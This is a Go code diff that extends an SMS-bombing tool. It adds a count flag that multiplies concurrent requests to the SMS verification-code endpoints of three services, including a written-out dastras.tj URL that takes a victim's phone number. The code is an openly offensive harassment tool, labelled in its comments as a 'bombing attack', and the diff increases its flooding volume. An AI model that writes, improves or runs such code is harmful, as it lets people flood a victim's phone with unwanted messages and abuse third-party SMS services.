@@ -35,6 +35,7 @@ type ServiceStatus struct {
 
 func main() {
 	phoneNumber := flag.Int("number", 0, "Phone number")
+	count := flag.Int("count", 1, "Count")
 	flag.Parse()
 
 	if *phoneNumber == 0 {
@@ -43,16 +44,17 @@ func main() {
 
 	bomber := &SmsBomber{
 		PhoneNumber: *phoneNumber,
-		Status:      make(chan ServiceStatus), // Initialize the status channel
-		Counters:    make(map[string]int),     // Initialize counters map
+		Status:      make(chan ServiceStatus, *count*10), // Initialize the status channel
+		Counters:    make(map[string]int),                // Initialize counters map
 	}
 
 	// Start the bomber
-	go bomber.Start()
 
 	// Wait for interrupt signal (Ctrl+C)
 	interrupt := make(chan os.Signal, 1)
 	signal.Notify(interrupt, os.Interrupt, syscall.SIGTERM)
+
+	go bomber.Start(*count)
 
 	// Wait for interrupt signal
 	<-interrupt
@@ -60,21 +62,24 @@ func main() {
 	// Stop the bomber
 	bomber.Stop()
 
+	close(interrupt)
 	// Print the results
 	bomber.PrintResults()
 }
 
 // Start method to start the bombing attack
-func (b *SmsBomber) Start() {
+func (b *SmsBomber) Start(count int) {
 	b.Running = true
 	fmt.Println("Bombing...")
 
 	var wg sync.WaitGroup
-	wg.Add(3)
 
-	go b.SomonService(&wg)
-	go b.AvrangService(&wg)
-	go b.DastrasService(&wg)
+	for i := 0; i < count; i++ {
+		wg.Add(3)
+		go b.SomonService(&wg)
+		go b.AvrangService(&wg)
+		go b.DastrasService(&wg)
+	}
 
 	wg.Wait()
 	close(b.Status) // Close the status channel after all goroutines finish
@@ -192,7 +197,6 @@ func (b *SmsBomber) AvrangService(wg *sync.WaitGroup) {
 // DastrasService method for attacking the Dastras service
 func (b *SmsBomber) DastrasService(wg *sync.WaitGroup) {
 	defer wg.Done()
-
 	URL := fmt.Sprintf("https://dastras.tj/index.php?slgh=acm_sms.generate_code&phone=%d&prefix=+992&is_ajax=1", b.PhoneNumber)
 	client := &http.Client{}
 	req, err := http.NewRequest("GET", URL, nil)
@@ -223,4 +227,5 @@ func (b *SmsBomber) DastrasService(wg *sync.WaitGroup) {
 	if statusCode == http.StatusOK {
 		fmt.Println("bombed")
 	}
+
 }
